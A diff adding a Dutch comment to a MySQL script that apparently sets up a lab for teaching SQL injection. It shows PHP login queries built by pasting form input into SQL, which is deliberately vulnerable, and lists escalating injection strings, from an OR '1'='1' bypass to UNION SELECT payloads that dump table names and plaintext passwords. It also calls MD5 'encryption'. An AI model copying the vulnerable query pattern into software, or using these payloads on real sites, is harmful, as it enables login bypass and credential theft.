@@ -1,0 +1,45 @@
+/*
+Dit mysql script kun je gebruiken met en zonder encyptie van passwords
+
+Hiermee worden 2 tabellen geïnstalleerd te weten:
+- user: met encryptie
+- userplainpasswords: zonder encryptie
+
+Zonder encrypie van passwords:
+Gebruik als query:
+$query = "SELECT * FROM userplainpasswords WHERE name = '".$_POST["voornaam"]."' and password = '".$_POST["wachtwoord"]."'";
+
+plak bij naam: lkjlkj' OR '1' = '1' #'
+
+
+
+code:
+$query = "SELECT * FROM user WHERE name = '".$_POST["voornaam"]."' and password = '".$_POST["password"]."'";
+echo "<br>".$query."<br>";
+
+$result = mysqli_query($link, $query);
+if (!mysqli_query($link, $query)) {
+    printf("Errormessage: %s\n", mysqli_error($link));
+}
+
+while($row = mysqli_fetch_array($result, MYSQLI_NUM)) {
+    print $row[0]." ".$row[1]." ".$row[2]."<br>";
+};
+
+
+Met encryptie van passwords
+Gebruik als query:
+//$query = "SELECT * FROM user WHERE name = '".$_POST["voornaam"]."' and password = '".MD5($_POST["wachtwoord"])."'";
+$query = "SELECT * FROM userplainpasswords WHERE name = '".$_POST["voornaam"]."' and password = '".$_POST["wachtwoord"]."'";
+//$query = "SELECT iduser, name FROM userplainpasswords WHERE name = '".$_POST["voornaam"]."' and password = '".$_POST["wachtwoord"]."'";
+
+plak bij naam: lkjlkj' OR '1' = '1' #'
+lkjlkj' OR '1' = '1' UNION SELECT 'a' #'
+lkjlkj' OR '1' = '1' UNION SELECT 'a', 'b','c'; #'
+lkjlkj' OR '1' = '1' UNION SELECT 'a', database(), 'c';#
+lkjlkj' OR '1' = '1' UNION SELECT table_schema,table_name, table_type FROM information_Schema.tables WHERE TABLE_TYPE = 'BASE TABLE';#
+lkjlkj' OR '1' = '1' UNION SELECT table_schema,column_name,table_name FROM information_Schema.columns WHERE table_name = 'userplainpasswords';#
+lkjlkj' OR '1' = '1' UNION SELECT iduser, password, name from userplainpasswords;#
+lkjlkj' OR '1' = '1' UNION SELECT Ts;#
+
+
